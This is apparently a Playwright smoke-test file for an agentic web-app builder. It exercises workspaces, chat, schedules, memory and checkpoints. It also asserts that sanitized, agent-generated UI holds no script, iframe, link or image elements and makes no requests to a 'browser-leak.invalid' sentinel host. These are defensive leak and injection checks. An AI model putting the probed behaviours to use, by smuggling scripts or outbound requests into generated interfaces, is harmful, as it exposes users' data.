        agent_analysis_turn = turn["input_message"].endswith(f"\n{AGENT_PROMPT}")
        output_message = (
            "Built the dashboard with durable priorities and interactive controls."
            if not has_bundle
            else (
                "Reviewed the current structured data and refreshed the dashboard analysis."
                if agent_analysis_turn
                else "Updated the web app from this request."
            )
        )
        _append_turn_event(
            workspace, "thread.message", {"message": output_message, "source": "agent"}
        )
        TURN_DEADLINES.pop(workspace["thread_id"], None)
        workspace["turn"] = None
        workspace["last_used_at"] = now
        if not has_bundle:
            title = (
                "Weekly focus"
                if builder_backend.THREAD_NAME_RE.fullmatch(
                    workspace["name"]
                )
                else workspace["name"]
            )
            built = _built_app(title)
            built["updated_at"] = now
            workspace["app"] = built
            _record_history(
                workspace, "ui", "agent",
                {
                    "html": built["html"], "css": built["css"],
                    "javascript": built["javascript"],
                },
            )
            _record_history(workspace, "snapshot", "agent", {"data": built["data"]})
        elif agent_analysis_turn:
            app["data"] = {
                **app["data"],
                "analysis": "Two priorities remain open; review the security item before shipping.",
            }
            app["data_version"] += 1
            app["updated_at"] = now
            _record_history(
                workspace, "data", "agent",
                {"action": "set", "path": ["analysis"], "value": app["data"]["analysis"]},
            )


def _append_turn_event(
    workspace: dict[str, Any],
    event_type: str,
    payload: dict[str, Any],
) -> None:
    events = workspace["events"]
    seq = events[-1]["seq"] + 1 if events else 1
    events.append(
        {
            "seq": seq,
            "timestamp": _now(),
            "event_id": f"event_{workspace['thread_id']}_{seq}",
            "event_type": event_type,
            "thread_id": workspace["thread_id"],
            "payload": payload,
        }
    )


def _path_segment(value: str) -> str:
    decoded = unquote(value)
    if not decoded or "/" in decoded or "\\" in decoded:
        raise builder_backend.AppError(
            HTTPStatus.BAD_REQUEST,
            "invalid path segment",
        )
    return decoded


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")


def desktop_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    leaked: list[str] = []
    page.on("request", lambda request: leaked.append(request.url) if "browser-leak.invalid" in request.url else None)
    page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
    expect(page.locator("#panel-app-personal_web_app_builder")).to_be_visible()
    expect(page.locator("body")).to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
    expect(page.get_by_role("button", name="Back to host", exact=True)).to_be_visible()
    frame = page.frame_locator('iframe[title="Agentic Web App"]')
    expect(frame.get_by_role("complementary", name="All apps", exact=True)).to_be_visible()

    # Home library, then a fresh workspace that lands in the admin chat.
    expect(frame.locator("#home-view")).to_be_visible()
    expect(frame.locator("#home-empty")).to_be_visible()
    center_offsets = frame.locator("#home-view").evaluate(
        """home => {
          const bounds = home.getBoundingClientRect();
          const center = bounds.left + bounds.width / 2;
          return [...home.querySelectorAll('.home-brand, .home-empty')]
            .map(element => Math.abs(element.getBoundingClientRect().left
              + element.getBoundingClientRect().width / 2 - center));
        }"""
    )
    if any(offset > 2 for offset in center_offsets):
        raise AssertionError(f"empty library is not centered: {center_offsets}")
    frame.locator("#home-empty-primary").click()
    expect(frame.locator("#admin-overlay")).to_be_visible()
    expect(frame.locator("#admin-close")).to_be_focused()
    expect(frame.get_by_text("App administration", exact=True)).to_be_visible()
    # The generated name counts the mock's existing workspaces, so derive it
    # instead of pinning app-1: any earlier flow that creates a workspace
    # shifts the number.
    expect(frame.locator("#admin-app-title")).to_have_text(re.compile(r"^app-[0-9]+$"))
    first_app = frame.locator("#admin-app-title").inner_text().strip()
    expect(frame.locator(".workspace-list-item.current")).to_contain_text(first_app)
    expect(frame.get_by_role("button", name="Close all apps", exact=True)).to_be_hidden()
    frame.locator("#admin-close").press("Escape")
    expect(frame.locator("#admin-overlay")).to_be_hidden()
    frame.locator("#admin-open").click()
    expect(frame.locator("#admin-overlay")).to_be_visible()
    expect(frame.locator("#runtime")).to_have_value("codex")
    expect(frame.locator("#model")).to_have_value("gpt-5.6-terra")
    expect(frame.locator("#effort")).to_have_value("high")
    expect(frame.locator("#runtime")).to_be_enabled()
    expect(frame.locator("#model")).to_be_enabled()
    expect(frame.locator("#effort")).to_be_enabled()

    with page.expect_file_chooser() as chooser:
        frame.get_by_role("button", name="Attach files").click()
    chooser.value.set_files({
        "name": "weekly-focus.txt",
        "mimeType": "text/plain",
        "buffer": b"Prioritize the release checklist.",
    })
    expect(frame.locator("#attachments")).to_contain_text("weekly-focus.txt")
    frame.locator("#message").fill("Build a small weekly focus dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    frame.locator("#agent-settings").hover()
    expect(frame.locator("#agent-settings-idle-note")).to_be_visible()
    expect(frame.locator("#agent-settings-idle-note")).to_contain_text(
        "Stop this app's agent first"
    )
    expect(frame.locator("#runtime")).to_be_disabled()
    expect(frame.locator("#model")).to_be_disabled()
    expect(frame.locator("#effort")).to_be_disabled()
    expect(frame.locator("#attachments")).to_be_hidden()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by user:")
    expect(frame.locator("#chat-history")).to_contain_text("Build a small weekly focus dashboard.")
    expect(frame.locator("#chat-history")).to_contain_text(
        "[User-uploaded file: user-files/20260722T120000.000000Z_weekly-focus.txt]"
    )
    expect(frame.locator("#chat-history")).to_contain_text(INTERIM_AGENT_MESSAGE)
    activity_toggle = frame.get_by_role("switch", name="Activity", exact=True)
    expect(activity_toggle).to_have_attribute("aria-checked", "true")
    expect(activity_toggle).to_have_attribute("title", "Hide agent activity")
    activity = frame.locator(".chat-activity", has_text="Inspecting app workspace")
    expect(activity).to_have_count(1)
    expect(activity).to_be_visible()
    activity.locator("summary").click()
    expect(activity).to_contain_text("Reading files. Structured data loaded.")
    activity_toggle.click()
    expect(activity_toggle).to_have_attribute("aria-checked", "false")
    expect(activity_toggle).to_have_attribute("title", "Show agent activity")
    expect(activity).to_be_hidden()
    expect(frame.get_by_text(INTERIM_AGENT_MESSAGE, exact=True)).to_be_visible()
    activity_toggle.click()
    expect(activity_toggle).to_have_attribute("aria-checked", "true")
    expect(activity).to_be_visible()
    # The first turn runs MOCK_FIRST_TURN_SECONDS and the mock only completes
    # it when a request arrives, so the bundle can land a whole 3s poll late.
    expect(frame.locator(".dashboard")).to_be_visible(timeout=20_000)
    expect(frame.locator("#runtime")).to_be_enabled()
    expect(frame.locator("#model")).to_be_enabled()
    expect(frame.locator("#effort")).to_be_enabled()
    frame.locator("#model").select_option("gpt-5.6-sol")
    expect(frame.locator("#agent-session-change-warning")).to_be_visible()
    expect(frame.locator("#agent-session-change-warning")).to_contain_text(
        "provider cache reads will be invalidated"
    )
    frame.locator("#model").select_option("gpt-5.6-terra")
    expect(frame.locator("#agent-session-change-warning")).to_be_hidden()
    expect(frame.locator("#runtime-status")).to_have_text("Oversized render rejected")

    # Back to the full-screen canvas: sanitizer boundary assertions.
    frame.get_by_role("button", name="Go to app", exact=True).click()
    expect(frame.get_by_text("Interact with your app", exact=True)).to_be_visible()
    expect(frame.locator("#admin-overlay")).to_be_hidden()
    expect(frame.locator(".metric strong")).to_have_text("2")
    generated = frame.locator("#generated-host")
    expect(
        generated.locator(
            "img, a, iframe, object, embed, svg, math, template, noscript, unknown-surface, script"
        )
    ).to_have_count(0)
    expect(frame.locator("#promoted-safe-child")).to_have_text("Safe promoted child")
    expect(frame.locator("#semantic-probe abbr")).to_have_attribute("title", "Estimated")
    expect(frame.locator("#semantic-probe mark")).to_have_text("Highlighted")
    expect(frame.locator("#semantic-probe ruby rt")).to_have_text("trust")
    expect(frame.locator("#probe-priority")).to_have_attribute("name", "priority")
    expect(frame.locator("#probe-priority")).to_have_attribute("list", "priority-list")
    expect(frame.locator("#probe-priority")).to_have_attribute("inputmode", "text")
    expect(frame.locator("#priority-list option")).to_have_attribute("value", "Ship")
    foreign_script_ran = frame.locator("body").evaluate("() => window.__foreignScriptRan")
    if foreign_script_ran is not None:
        raise AssertionError("foreign-namespace script executed during sanitizer rebuild")
    sanitized_css = frame.locator("#generated-host").evaluate(
        "host => host.shadowRoot.querySelector('style').textContent"
    )
    if "@supports" in sanitized_css or "too-long-media" in sanitized_css:
        raise AssertionError(f"unsupported or oversized CSS group survived sanitization: {sanitized_css}")
    if "@media (max-width: 640px)" not in sanitized_css:
        raise AssertionError(f"bounded responsive media rule was dropped: {sanitized_css}")
    for expressive_css in (
        "--panel-start:#11151d",
        "linear-gradient",
        "filter:saturate(1)",
        "clip-path:inset(0px round 1px)",
        'content:"Safe"',
    ):
        if expressive_css not in sanitized_css:
            raise AssertionError(f"safe expressive CSS was dropped ({expressive_css}): {sanitized_css}")
    form_action = frame.locator(".dashboard").evaluate(
        "element => element.closest('form').getAttribute('action')"
    )
    if form_action is not None:
        raise AssertionError(f"generated form retained a navigation action: {form_action}")
    expect(frame.locator("#drag-source")).to_have_attribute("draggable", "true")
    expect(frame.locator("#drag-source")).to_have_attribute(
        "data-drag-value", "priority-ship"
    )
    expect(frame.locator("#drop-target")).to_have_attribute(
        "data-drop-action", "move-priority"
    )
    expect(frame.locator("#drop-target")).to_have_attribute(
        "data-drop-value", "priority-review"
    )
    expect(frame.locator("#bad-drop-target")).not_to_have_attribute(
        "data-drop-action", re.compile(".+")
    )
    page.wait_for_timeout(300)
    if leaked:
        raise AssertionError(f"agent-authored UI caused browser requests: {leaked}")

    reviewed = frame.get_by_role("checkbox", name="Reviewed", exact=True)
    frame.locator("#drag-source").drag_to(frame.locator("#drop-target"))
    expect(frame.locator("#runtime-status")).to_have_text(
        "Moved priority-ship before priority-review"
    )

    reviewed.click()
    expect(reviewed).to_be_checked()
    expect(frame.locator("#runtime-status")).to_have_text("Review marked complete")
    page.wait_for_timeout(100)

    # A data-only render patches the safe tree in place. An unrelated control
    # keeps its live checked state and focus instead of being torn down with
    # the whole generated interface.
    frame.get_by_role("button", name="Add priority", exact=True).evaluate(
        "button => button.click()"
    )
    expect(frame.locator(".metric strong")).to_have_text("3")
    expect(reviewed).to_be_focused()
    expect(reviewed).to_be_checked()

    # Durable rendering after a full reload: back through the home library.
    page.reload()
    expect(page.locator("#app")).to_be_visible()
    page.locator("#stable-app-tabs").get_by_role(
        "button", name="Agentic Web App", exact=True
    ).click()
    expect(frame.locator("#home-view")).to_be_visible()
    frame.locator(".app-card", has_text=first_app).click()
    expect(frame.locator(".metric strong")).to_have_text("3")
    expect(frame.locator("#admin-overlay")).to_be_hidden()

    frame.locator("#admin-open").click()
    expect(frame.locator("#admin-overlay")).to_be_visible()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by user:")
    expect(frame.locator("#chat-history")).to_contain_text("Built the dashboard")
    expect(frame.locator("#chat-history")).not_to_contain_text(LOAD_ONLY_PROMPT)
    frame.locator("#message").fill("Keep this unsent human draft.")
    frame.get_by_role("button", name="Go to app", exact=True).click()
    expect(frame.locator("#admin-overlay")).to_be_hidden()
    expect(frame.locator(".dashboard")).to_be_visible()

    # A generated control starts the exact agent instruction, no dialogs.
    frame.get_by_role("button", name="Refresh analysis", exact=True).click()
    expect(frame.locator("dialog")).to_have_count(0)
    expect(frame.locator("#runtime-status")).to_have_text("Sent to agent")
    frame.locator("#admin-open").click()
    expect(frame.locator("#chat-history")).to_contain_text("Requested by app:")
    expect(frame.locator("#chat-history")).to_contain_text(AGENT_PROMPT)
    expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")
    if leaked:
        raise AssertionError(f"generated interaction caused browser requests: {leaked}")

    page.once("dialog", lambda dialog: dialog.accept("Weekly focus"))
    frame.get_by_role("button", name="Rename app", exact=True).click()
    expect(frame.locator("#admin-app-title")).to_have_text("Weekly focus")
    expect(frame.locator(".workspace-list-item.current")).to_contain_text("Weekly focus")

    # Schedules: create, see the cadence, pause.
    frame.get_by_role("tab", name="Schedules", exact=True).click()
    frame.locator("#schedule-name").fill("Morning review")
    frame.locator("#schedule-message").fill("Summarize yesterday and refresh the dashboard.")
    frame.locator("#schedule-cadence").select_option("daily")
    frame.locator("#schedule-time").fill("09:00")
    frame.get_by_role("button", name="Add schedule", exact=True).click()
    schedule_card = frame.locator(".schedule-card", has_text="Morning review")
    expect(schedule_card).to_be_visible()
    expect(schedule_card).to_contain_text("Daily at 09:00 UTC")
    schedule_card.get_by_role("button", name="Pause", exact=True).click()
    expect(schedule_card).to_contain_text("Paused")
    schedule_card.get_by_role("button", name="Resume", exact=True).click()
    expect(schedule_card).to_contain_text("Next")

    # Memory: always-on instructions and a named memory.
    frame.get_by_role("tab", name="Memory", exact=True).click()
    frame.locator("#instructions-editor").fill("Keep the dashboard tone friendly.")
    frame.get_by_role("button", name="Save instructions", exact=True).click()
    expect(frame.locator("#instructions-status")).to_have_text("Saved")
    expect(frame.locator("#instructions-meta")).to_contain_text("you")
    frame.get_by_role("button", name="New memory", exact=True).click()
    frame.locator("#memory-name").fill("weekly-cadence")
    frame.locator("#memory-description").fill("Reviews happen every Monday morning")
    frame.locator("#memory-body").fill("The human reviews priorities on Mondays at 9am UTC.")
    frame.get_by_role("button", name="Save memory", exact=True).click()
    memory_item = frame.locator(".memory-item", has_text="weekly-cadence")
    expect(memory_item).to_be_visible()
    expect(memory_item).to_contain_text("Reviews happen every Monday morning")
    # Topics read in place: the body expands under the row.
    memory_item.locator("button[data-memory-toggle]").click()
    expect(memory_item.locator(".memory-body-view")).to_contain_text("Mondays at 9am UTC")

    # Save one whole-workspace recovery point, then make a mistake.
    frame.get_by_role("tab", name="Recovery", exact=True).click()
    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
    expect(frame.locator("#checkpoint-status")).to_contain_text("up to date")
    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_be_visible()
    frame.get_by_role("tab", name="Memory", exact=True).click()
    frame.get_by_role("button", name="New memory", exact=True).click()
    frame.locator("#memory-name").fill("scratch-note")
    frame.locator("#memory-description").fill("Temporary note")
    frame.locator("#memory-body").fill("Delete me via undo.")
    frame.get_by_role("button", name="Save memory", exact=True).click()
    expect(frame.locator(".memory-item", has_text="scratch-note")).to_be_visible()
    frame.get_by_role("tab", name="Recovery", exact=True).click()
    saved_point = frame.locator(".history-item", has_text="My saved checkpoint").first
    page.once("dialog", lambda dialog: dialog.accept())
    saved_point.get_by_role("button", name="Revert", exact=True).click()
    frame.get_by_role("tab", name="Memory", exact=True).click()
    expect(frame.locator(".memory-item", has_text="scratch-note")).to_have_count(0)
    expect(frame.locator(".memory-item", has_text="weekly-cadence")).to_be_visible()

    # The injected context block never appears in displayed chat bubbles.
    frame.get_by_role("tab", name="Chat", exact=True).click()
    frame.locator("#message").fill("Note my preferences.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    expect(frame.locator("#chat-history")).to_contain_text("Note my preferences.")
    expect(frame.locator("#chat-history")).not_to_contain_text("[Workspace context]")
    # Leave a genuine unsent draft for the later cross-workspace isolation
    # check. The submitted text above is correctly cleared after delivery.
    frame.locator("#message").fill("Keep this unsent human draft.")

    # Re-saving today updates the one manual slot instead of adding clutter.
    frame.get_by_role("tab", name="Recovery", exact=True).click()
    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
    frame.get_by_role("button", name="Save checkpoint", exact=True).click()
    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_have_count(1)
    expect(frame.locator(".history-item", has_text="Daily snapshot")).to_have_count(1)
    frame.get_by_role("button", name="Go to app", exact=True).click()
    # The manual point was saved after the generated refresh raised the count;
    # whole-workspace recovery preserves that exact saved state.
    expect(frame.locator(".metric strong")).to_have_text("3")

    # A second workspace has a separate thread, bundle, data, and drafts.
    frame.locator("#workspace-new-app").click()
    expect(frame.locator("#admin-overlay")).to_be_visible()
    # A new workspace takes the next generated name, whatever the counter is at.
    expect(frame.locator("#admin-app-title")).to_have_text(re.compile(r"^app-[0-9]+$"))
    second_app = frame.locator("#admin-app-title").inner_text().strip()
    if second_app == first_app:
        raise AssertionError(f"a new workspace reused the previous name: {second_app}")
    page.once("dialog", lambda dialog: dialog.accept("Scratch app"))
    frame.get_by_role("button", name="Rename app", exact=True).click()
    expect(frame.locator("#admin-app-title")).to_have_text("Scratch app")
    frame.locator("#message").fill("Build a separate scratch dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    # A second first turn: same MOCK_FIRST_TURN_SECONDS plus poll budget.
    expect(frame.locator(".dashboard h1")).to_have_text("Scratch app", timeout=20_000)
    frame.locator("#message").fill("Keep this scratch-app draft.")
    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
    expect(frame.locator(".metric strong")).to_have_text("3")
    frame.locator("#admin-open").click()
    expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")
    expect(frame.locator("#chat-history")).not_to_contain_text(
        "separate scratch dashboard"
    )
    frame.locator(".workspace-list-item", has_text="Scratch app").click()
    frame.locator("#admin-open").click()
    expect(frame.locator("#message")).to_have_value("Keep this scratch-app draft.")
    expect(frame.locator("#chat-history")).to_contain_text(
        "separate scratch dashboard"
    )
    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
    expect(frame.locator(".dashboard")).to_be_visible()
    page.get_by_role("button", name="Back to host", exact=True).click()
    expect(page.locator("body")).not_to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
    expect(page.locator("#panel-home")).to_be_visible()


def mobile_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    page.locator("#mobile-nav-toggle").click()
    page.locator("#stable-app-tabs").get_by_role("button", name="Agentic Web App", exact=True).click()
    expect(page.locator("body")).to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
    expect(page.get_by_role("button", name="Back to host", exact=True)).to_be_visible()
    frame = page.frame_locator('iframe[title="Agentic Web App"]')
    expect(frame.get_by_role("complementary", name="All apps", exact=True)).to_be_visible()
    frame.get_by_role("button", name="Close all apps", exact=True).click()
    expect(frame.get_by_role("button", name="All apps", exact=True)).to_be_visible()
    expect(frame.locator("#home-view")).to_be_visible()
    frame.get_by_role("button", name="All apps", exact=True).click()
    frame.locator(".workspace-list-item", has_text="Weekly focus").click()
    expect(frame.locator(".dashboard")).to_be_visible()
    expect(frame.locator("#admin-open")).to_be_visible()
    frame.locator("#admin-open").click()
    expect(frame.locator("#admin-overlay")).to_be_visible()
    expect(frame.locator("#runtime")).to_be_visible()
    expect(frame.locator("#model")).to_be_visible()
    expect(frame.locator("#effort")).to_be_visible()
    expect(frame.locator("#runtime")).to_be_enabled()
    frame.get_by_role("tab", name="Schedules", exact=True).click()
    expect(frame.locator(".schedule-card", has_text="Morning review")).to_be_visible()
    frame.get_by_role("tab", name="Recovery", exact=True).click()
    expect(frame.locator(".history-item", has_text="My saved checkpoint")).to_be_visible()
    expect(frame.get_by_role("button", name="Save checkpoint", exact=True)).to_be_visible()
    touch_heights = frame.locator(
        "#admin-close, .admin-tab, #checkpoint-save, .history-revert"
    ).evaluate_all("elements => elements.map(element => element.getBoundingClientRect().height)")
    if any(height < 43 for height in touch_heights):
        raise AssertionError(f"mobile admin controls are too short: {touch_heights}")
    frame.get_by_role("button", name="Go to app", exact=True).click()
    expect(frame.locator("#admin-overlay")).to_be_hidden()
    overflow = frame.locator("html").evaluate(
        "() => document.documentElement.scrollWidth - document.documentElement.clientWidth"
    )
    if overflow > 1:
        raise AssertionError(f"Agentic Web App overflows horizontally by {overflow}px")

    page.get_by_role("button", name="Back to host", exact=True).click()
    expect(page.locator("body")).not_to_have_class(re.compile(r"\bhost-fullscreen-app-open\b"))
